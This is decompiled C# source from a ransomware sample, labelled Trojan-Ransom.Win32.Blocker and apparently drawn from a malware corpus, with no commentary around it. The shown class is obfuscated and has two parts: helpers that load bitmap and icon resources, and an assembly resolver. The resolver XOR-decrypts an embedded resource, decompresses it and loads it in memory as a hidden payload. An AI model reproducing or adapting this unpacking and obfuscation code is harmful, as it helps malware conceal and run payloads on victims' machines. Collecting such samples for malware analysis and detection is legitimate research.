// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴐ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using My;
using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartExceptionsWithUI;
using SmartAssembly.Zip;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Ⴈ
{
  internal sealed class Ⴐ
  {
    internal static Ⴈ.Ⴐ.Ⴓ Ⴅ;

    public static Bitmap Ⴄ(string Ⴗ)
    {
      int num1;
      Stream stream;
      Bitmap bitmap1;
      try
      {
        try
        {
          num1 = 4;
          while (true)
          {
            switch (num1)
            {
              case 2:
                goto label_5;
              case 3:
                num1 = 6;
                continue;
              case 5:
              case 7:
                goto label_6;
              case 6:
                num1 = stream == null ? 5 : 2;
                continue;
              default:
                stream = Win32.Ⴜ(SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴐ(270, 358), SendingReportFeedbackEventArgs1.Ⴄ(MyComputer.Ⴗ(834542914, 5), Ⴗ, MyComputer.Ⴗ(834542973, 3), 709, 761), 953, 983);
                goto case 3;
            }
          }
label_5:
          Bitmap bitmap2 = new Bitmap(stream);
          goto label_7;
label_6:
          bitmap2 = (Bitmap) null;
label_7:
          bitmap1 = bitmap2;
        }
        catch
        {
          bitmap1 = (Bitmap) null;
        }
        switch (1)
        {
          default:
            return bitmap1;
        }
      }
      catch (Exception ex)
      {
        Stream o1 = stream;
        Bitmap o2 = bitmap1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num1;
        int num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num2;
        string o5 = Ⴗ;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    public static Icon Ⴃ(string Ⴅ)
    {
      int num1;
      Stream stream;
      Icon icon1;
      try
      {
        try
        {
          num1 = 1;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 2:
              case 5:
                goto label_4;
              case 4:
                goto label_5;
              case 6:
              case 7:
                num1 = stream == null ? 4 : 0;
                continue;
              default:
                stream = Win32.Ⴜ(SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴐ(956, 980), SendingReportFeedbackEventArgs1.Ⴄ(MyComputer.Ⴗ(834542917, 2), Ⴅ, Ⴈ.Ⴀ.Ⴐ(1468303453, 0), 747, 727), 779, 869);
                num1 = 6;
                continue;
            }
          }
label_4:
          Icon icon2 = new Icon(stream);
          goto label_6;
label_5:
          icon2 = (Icon) null;
label_6:
          icon1 = icon2;
        }
        catch
        {
          icon1 = (Icon) null;
        }
        switch (2)
        {
          default:
            return icon1;
        }
      }
      catch (Exception ex)
      {
        Stream o1 = stream;
        Icon o2 = icon1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num1;
        int num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num2;
        string o5 = Ⴅ;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    public Ⴐ()
    {
      try
      {
      }
      catch (Exception ex)
      {
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static Ⴐ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static Assembly Ⴗ([In] object obj0, [In] ResolveEventArgs obj1)
    {
      try
      {
        // ISSUE: field reference
        return Ⴈ.Ⴐ.Ⴀ(obj1, __fieldref (Ⴈ.Ⴐ.Ⴅ), 65452, "e7786c32-bf20-4b2e-817f-020f0fa82469", 21);
      }
      catch (Exception ex)
      {
        object o1 = obj0;
        ResolveEventArgs o2 = obj1;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException2(ex, o1, (object) o2);
        throw;
      }
    }

    internal static Assembly Ⴀ(
      ResolveEventArgs args,
      RuntimeFieldHandle resourceField,
      int resourceLength,
      string nameGuid,
      int offset)
    {
      int num1;
      Assembly assembly1;
      string name;
      AppDomain appDomain;
      Dictionary<string, string> dictionary;
      byte[] buffer;
      int index1;
      MemoryStream memoryStream;
      DeflateStream deflateStream;
      int num2;
      byte[] numArray;
      int num3;
      int num4;
      int num5;
      Assembly assembly2;
      string[] strArray;
      int index2;
      string key;
      try
      {
label_3:
        while (resourceLength > 0)
        {
          num1 = 3;
          while (true)
          {
            switch (num1)
            {
              case 0:
                name = \u003CPrivateImplementationDetails\u003E.Ⴈ(nameGuid, SimpleZip.ႭႨ(1491049159, 8), 539, 574);
                num1 = 4;
                continue;
              case 1:
                if (dictionary == null)
                {
                  num1 = 13;
                  continue;
                }
                goto label_37;
              case 2:
                index1 = 0;
                num1 = 7;
                continue;
              case 3:
                assembly1 = SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴅ(136, 191);
                goto case 0;
              case 4:
                appDomain = SmartAssembly.SmartUsageCore.ReportUsageAttribute.Ⴗ(779, 895);
                dictionary = (Dictionary<string, string>) ႷႭ.ႣႳ(appDomain, nameGuid, 528, 637);
                num1 = 1;
                continue;
              case 5:
                ++index1;
                num1 = 7;
                continue;
              case 6:
              case 10:
                goto label_16;
              case 7:
                num1 = index1 < resourceLength ? 9 : 6;
                continue;
              case 8:
                SmartAssembly.SmartExceptionsCore.ReportUsageAttribute.Ⴄ((Array) buffer, resourceField, 679, 707);
                goto case 2;
              case 9:
                buffer[index1] ^= (byte) (index1 + offset & (int) byte.MaxValue);
                num1 = 5;
                continue;
              case 12:
                goto label_3;
              case 13:
                dictionary = new Dictionary<string, string>();
                Ⴈ.Ⴐ.ႥႠ(appDomain, nameGuid, (object) dictionary, 66, 77);
                buffer = new byte[resourceLength];
                num1 = 8;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴐ.Ⴀ);
                num1 = 12;
                continue;
            }
          }
label_16:
          memoryStream = new MemoryStream();
          deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
          try
          {
            num2 = 1;
            while (true)
            {
              switch (num2)
              {
                case 2:
                case 3:
                  WaitSendingReportControl.ႥႤ((Stream) memoryStream, numArray, 0, num3, 911, 991);
                  goto case 4;
                case 4:
                  num2 = (num3 = UnhandledExceptionHandlerWithUI.ႷႳ((Stream) deflateStream, numArray, 0, numArray.Length, 357, 342)) > 0 ? 2 : 5;
                  continue;
                case 5:
                  goto label_28;
                case 7:
                  num2 = 4;
                  continue;
                default:
                  numArray = new byte[1024];
                  goto case 7;
              }
            }
          }
          finally
          {
            num4 = 4;
            while (true)
            {
              switch (num4)
              {
                case 2:
                  goto label_26;
                case 5:
                case 6:
                  goto label_27;
                default:
                  num4 = deflateStream == null ? 5 : 2;
                  continue;
              }
            }
label_26:
            deflateStream.Dispose();
label_27:;
          }
label_28:
          num5 = 0;
label_29:
          while (true)
          {
            switch (num5)
            {
              case 1:
              case 5:
                goto label_37;
              case 2:
                num5 = 8;
                continue;
              case 3:
                key = strArray[index2];
                dictionary[key] = key;
                ++index2;
                num5 = 6;
                continue;
              case 4:
                num5 = 13;
                continue;
              case 6:
                num5 = index2 < strArray.Length ? 3 : 2;
                continue;
              case 7:
                goto label_39;
              case 8:
                num5 = !dictionary.ContainsKey(args.Name) ? 9 : 7;
                continue;
              case 9:
                goto label_40;
              case 11:
                index2 = 0;
                num5 = 6;
                continue;
              case 13:
                SimpleZip.ႤႷ.ႷႠ(appDomain, name, (object) assembly2, 621, 569);
                strArray = AppRegistryKeys.Ⴓ(assembly2, 296, 359);
                num5 = 11;
                continue;
              default:
                assembly2 = AppNameFinder.Ⴃ(ႳႳ.ႥႭ(memoryStream, 705, 708), (byte[]) null, AppPathFinder.Ⴀ(assembly1, 366, 288), 581, 514);
                goto case 4;
            }
          }
label_39:
          return assembly2;
label_37:
          assembly2 = (Assembly) appDomain.GetData(name);
          num5 = 8;
          goto label_29;
        }
label_40:
        return (Assembly) null;
      }
      catch (Exception ex)
      {
        object[] objects = new object[23]
        {
          (object) assembly1,
          (object) name,
          (object) appDomain,
          (object) dictionary,
          (object) assembly2,
          (object) buffer,
          (object) index1,
          (object) memoryStream,
          (object) deflateStream,
          (object) numArray,
          (object) num3,
          (object) key,
          (object) strArray,
          (object) index2,
          (object) num1,
          (object) num2,
          (object) num4,
          (object) num5,
          (object) args,
          (object) resourceField,
          (object) resourceLength,
          (object) nameGuid,
          (object) offset
        };
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    internal static void Ⴈ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 2;
              continue;
            case 1:
            case 5:
              goto label_7;
            case 4:
              goto label_8;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 38:
                  num2 = 5;
                  break;
                default:
                  num2 = 0;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.Close();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Stream o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static long Ⴐ([In] Stream obj0, [In] long obj1, [In] SeekOrigin obj2, [In] int obj3, [In] int obj4)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj4 ^ obj3)
        {
          case 33:
            num2 = 0;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 3:
              goto label_8;
            case 4:
              num1 = 5;
              continue;
            case 5:
            case 7:
              goto label_3;
            case 6:
              num1 = 5;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴐ.Ⴐ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return obj0.Seek(obj1, obj2);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Stream o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<long> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<SeekOrigin> o4 = (Enum) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj4;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static char Ⴍ([In] int obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 55:
            num2 = 2;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 4;
              continue;
            case 1:
            case 3:
            case 6:
              num1 = 4;
              continue;
            case 2:
            case 5:
              goto label_8;
            case 4:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴐ.Ⴍ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return Convert.ToChar(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static int ႥႳ([In] StackFrame obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 72:
            num2 = 1;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 2:
              goto label_8;
            case 4:
              num1 = 7;
              continue;
            case 5:
            case 6:
              num1 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴐ.ႥႳ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return obj0.GetILOffset();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        StackFrame o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static System.Type[] ႥႥ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 80:
            num2 = 3;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              goto label_8;
            case 1:
              num1 = 7;
              continue;
            case 2:
              num1 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴐ.ႥႥ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return obj0.GetTypes();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Assembly o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static string ႥႷ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 77:
            num2 = 0;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 7:
              goto label_8;
            case 1:
              num1 = 4;
              continue;
            case 3:
            case 6:
              num1 = 4;
              continue;
            case 4:
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴐ.ႥႷ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return obj0.Namespace;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        System.Type o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void ႥႠ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
label_0:
      try
      {
        switch ((obj4 ^ obj3) - 15)
        {
          case 0:
            obj0.SetData(obj1, obj2);
            break;
          default:
            goto label_0;
        }
      }
      catch (Exception ex)
      {
        AppDomain o1 = obj0;
        string o2 = obj1;
        object o3 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj4;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, o3, (object) o4, (object) o5);
        throw;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 65452, Pack = 1)]
    private struct Ⴓ
    {
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴜ
    {
      internal Label Ⴅ;
      internal Image Ⴃ;
      internal bool Ⴄ;
      internal Timer Ⴍ;
      internal bool Ⴈ;
      internal string Ⴀ;
      internal float Ⴗ;
      internal float Ⴐ;
    }
  }
}
